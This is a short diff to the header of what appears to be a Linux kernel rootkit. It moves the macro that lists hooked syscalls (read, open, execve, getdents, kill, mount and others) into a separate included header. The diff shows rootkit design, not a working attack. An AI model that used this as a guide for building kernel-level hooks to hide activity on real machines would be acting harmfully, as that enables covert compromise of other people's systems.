@@ -1,29 +1,15 @@
 #ifndef _ROOTKIT_SYSCALL_HOOKS_H_
 #define _ROOTKIT_SYSCALL_HOOKS_H_
 
+#include "hooked_syscalls.h"
 #include "hooking.h"
 #include "macro_utils.h"
 #include "utils.h"
 #include <asm/unistd.h>
 
-/* All hooked syscalls */
-#define HOOKED_SYSCALLS                                                                     \
-    read, pread64, write, sendfile,                              /* read_write.c */         \
-        open, openat, openat2, creat, truncate, open_tree,       /* open.c */               \
-        access, faccessat, faccessat2,                           /* access.c */             \
-        stat, lstat, newfstatat, statx, readlink, readlinkat,    /* stat.c */               \
-        chdir, chroot, chmod, fchmodat, chown, lchown, fchownat, /* chx.c */                \
-        uselib, execve, execveat,                                /* exec.c */               \
-        getdents, getdents64,                                    /* getdents.c */           \
-        kill,                                                    /* kill.c */               \
-        link, linkat, unlink, unlinkat, rename, renameat, renameat2, mkdir, mkdirat, mknod, \
-        mknodat, rmdir, name_to_handle_at,                                    /* name.c */  \
-        mount, umount2, move_mount, pivot_root, mount_setattr, statfs, sysfs, /* mount.c */ \
-        swapon, swapoff,                                                      /* swap.c */  \
-        setxattr, lsetxattr, getxattr, lgetxattr, listxattr, llistxattr, removexattr,       \
-        lremovexattr,                       /* xattr.c */                                   \
-        acct, quotactl,                     /* kernel.c */                                  \
-        utime, utimes, utimensat, futimesat /* utimes.c */
+#ifndef HOOKED_SYSCALLS
+#define HOOKED_SYSCALLS
+#endif
 
 #define P_SYSCALL_HOOKS p_syscall_hooks /* Variable name for the syscall hook array */
 #define P_ORIG_SYSFUNS  p_orig_sysfuns  /* Variable name for the original syscall functions array */
